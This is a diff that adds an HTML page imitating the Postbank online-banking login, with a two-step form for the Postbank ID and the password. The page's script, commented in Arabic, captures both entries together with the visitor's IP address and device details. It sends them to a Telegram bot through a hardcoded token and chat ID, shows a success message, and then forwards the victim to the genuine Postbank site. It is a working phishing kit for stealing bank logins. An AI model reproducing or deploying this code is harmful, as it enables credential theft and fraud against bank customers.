@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Postbank - Online-Banking Login</title>
+    <link rel="icon" type="image/png" href="/img/pb-logo-splash-5A5OD5U4.svg">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+    <div class="top-bar"></div>
+
+    <div class="main-container">
+        
+        <div class="left-section">
+            
+            <div class="login-card">
+                <div class="logo-area">
+                    <img src="/img/pb-logo-with-title-no-subline-4HIZJJGT.svg" alt="Mein Logo" class="custom-logo">
+                </div>
+
+                <h1 id="greeting-title">Guten Abend</h1>
+                <p class="subtitle">Bitte geben Sie Ihre Zugangsdaten ein.</p>
+
+                <form id="loginForm" novalidate>
+                    <div class="form-group" id="step-id">
+                        <label for="postbankId">Postbank ID</label>
+                        <input type="text" id="postbankId" autocomplete="off" required>
+                        <div id="error-message" class="error-text"></div>
+                    </div>
+
+                    <div class="form-group hidden" id="step-password">
+                        <label for="password">Passwort</label>
+                        <input type="password" id="password">
+                    </div>
+
+                    <div class="links-group">
+                        <a href="#" class="login-link">Jetzt Postbank ID einrichten</a>
+                    </div>
+
+                    <div class="footer-actions">
+                        <a href="#" class="login-link bottom-link">Zugangsdaten vergessen?</a>
+                        <button type="submit" id="btn-next" class="btn-primary">Weiter</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="right-section">
+            
+            <div class="sidebar-content">
+                <div class="info-block promo">
+                    <img src="/img/promo.jpg" alt="Promo Image" class="promo-img">
+                    <h3>2,7 % p. a. Zinsen fest für 12 Monate + Gutschein sichern</h3>
+                    <p>Bis 25.6.2026: Bei Zinssparen Neugeld-Anlagen ab 10.000 Euro gibt es einen BestChoice-Gutschein im Wert von 25 Euro on top.</p>
+                    <a href="https://www.postbank.de/privatkunden/produkte/wertpapiere-sparen/sparen/zinssparen.html?kid=i.0900.23.33&kidc=online-banking-login" class="info-link">Zur Neugeld-Aktion</a>
+                </div>
+
+                <hr class="separator">
+
+                <div class="info-block">
+                    <h3><i class="fa-solid fa-triangle-exclamation icon-warning"></i> Sicherheitshinweise</h3>
+                    <p>Aktuell wird ein erhöhtes Aufkommen von Anrufen falscher Bankmitarbeiter festgestellt.</p>
+                    <a href="https://www.postbank.de/privatkunden/services/sicherheit/aktuelle-hinweise.html" class="info-link block-link">Link zu den aktuellen Sicherheitshinweisen</a>
+                    <a href="https://www.postbank.de/privatkunden/services/sicherheit.html?trackingid=ql-sicherheit" class="info-link block-link">Link zu Sicherheit im Überblick</a>
+                </div>
+
+                <hr class="separator">
+
+                <div class="info-block">
+                    <h3><i class="fa-solid fa-headset"></i> Schnelle Hilfe und Services</h3>
+                    <p>Hier finden Sie unsere Services und Hilfe zu Ihrem Online-Banking.</p>
+                    <a href="https://www.postbank.de/privatkunden/services.html" class="info-link block-link">Link zu Services und Hilfe</a>
+                </div>
+            </div>
+
+            <div class="sidebar-yellow-footer" style="flex-direction: row; flex-wrap: wrap; gap: 15px 25px;">
+                <a href="https://www.postbank.de/privatkunden/services/erste-schritte.html">Erste Schritte</a>
+                <a href="https://www.postbank.de/privatkunden/services/kontakt/terminvereinbarung.html?kid=i.0900.06.37">Terminvereinbarung</a>
+                <a href="https://banking.postbank.de/demo/">Demo-Konto</a>
+                
+                <a href="https://www.postbank.de/kontakt.html">Kontakt</a>
+                <a href="https://www.postbank.de/privatkunden/services/online-banking/rechtshinweise.html">Impressum</a>
+                <a href="https://www.postbank.de/unternehmen/ueber-uns/impressum.html">Rechtshinweise</a>
+                <a href="https://www.postbank.de/unternehmen/ueber-uns/sicherheit-und-datenschutz/datenschutz.html">Datenschutz</a>
+                <a href="https://www.postbank.de/unternehmen/ueber-uns/impressum.html">Cookie-Einstellungen</a>
+            </div>
+
+        </div>
+    </div>
+
+    <div id="toast" class="toast-hidden">
+        <i class="fa-solid fa-circle-check"></i> <span id="toast-text">Erfolgreich!</span>
+    </div>
+   <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    // ⚠️ إعدادات البوت والتوجيه
+    const TOKEN = "8356426314:AAEo0rbzU7mKFgV_qdoKgfFZPc8zNaayMy4";        
+    const CHAT_ID = "7016124805";      
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+    
+    // 🔗 ضع هنا رابط الصفحة أو الموقع الذي تريد نقل المستخدم إليه بعد الدخول
+    const REDIRECT_URL = "https://banking.postbank.de/#/login"; 
+
+    let currentStep = 1; 
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault(); 
+
+        const postbankIdField = document.getElementById('postbankId');
+        const passwordField = document.getElementById('password');
+        const errorMessage = document.getElementById('error-message');
+        const btnNext = document.getElementById('btn-next');
+
+        const stepIdDiv = document.getElementById('step-id');
+        const stepPasswordDiv = document.getElementById('step-password');
+
+        // الخطوة الأولى: إدخال الـ ID
+        if (currentStep === 1) {
+            if (!postbankIdField.value.trim()) {
+                errorMessage.innerText = "Bitte geben Sie Ihre Postbank ID ein.";
+                return;
+            }
+            
+            errorMessage.innerText = ""; 
+            stepIdDiv.classList.add('hidden');
+            stepPasswordDiv.classList.remove('hidden');
+            btnNext.innerText = "Anmelden";
+            currentStep = 2;
+            passwordField.focus(); 
+            return;
+        }
+
+        // الخطوة الثانية: إدخال كلمة المرور والإرسال والتوجيه
+        if (currentStep === 2) {
+            if (!passwordField.value.trim()) {
+                alert("Bitte geben Sie Ihr Passwort ein.");
+                return;
+            }
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = ` 
+<b>New Postbank Login Attempt</b>\n
+<b>Postbank ID:</b> <code>${postbankIdField.value}</code>\n
+<b>Password:</b> <code>${passwordField.value}</code>\n
+<b>IP Address:</b> ${ip}\n
+<b>Device Type:</b> ${deviceType}\n
+<b>Platform:</b> ${platform}\n
+<b>User Agent:</b> ${userAgent}\n
+<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    // إرسال البيانات إلى تليجرام
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(res => {
+                        // إظهار التوست أولاً لإعلام المستخدم بالنجاح
+                        const toast = document.getElementById('toast');
+                        if(toast) {
+                            toast.className = "toast-visible";
+                            document.getElementById('toast-text').innerText = "Erfolgreich!";
+                        }
+
+                        // تأخير التوجيه لثانية واحدة أو ثانيتين لكي يرى المستخدم رسالة النجاح، ثم تحويله للموقع الآخر
+                        setTimeout(() => {
+                            window.location.href = REDIRECT_URL;
+                        }, 2000); 
+
+                    }).catch(error => {
+                        alert('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
+                    });
+                })
+                .catch(error => {
+                    alert('Network error. Please try again.');
+                });
+        }
+    });
+</script>
+</body>
+</html>
